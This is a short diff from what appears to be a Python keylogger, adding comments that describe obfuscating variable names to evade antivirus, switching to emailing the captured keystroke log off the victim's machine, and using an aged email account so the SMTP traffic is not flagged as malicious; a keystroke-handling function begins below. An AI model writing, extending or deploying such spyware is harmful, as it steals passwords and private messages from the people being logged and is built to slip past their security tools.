@@ -7,6 +7,10 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+#Essentially the same script as v1, but a little more obfuscated to try to hide from AV. ie; variables like log_keystroke changed to E
+#As well as the removal of Flask, replaced with Mime to receive the log.txt fully remote via email.
+#May have trouble sending and receiving emails, it's best to used an aged account for sending so the SMTP connection request isn't seen as malicious. WIP
+
 def E(F):
     F = str(F).replace("'", "")
     if F == 'Key.space':
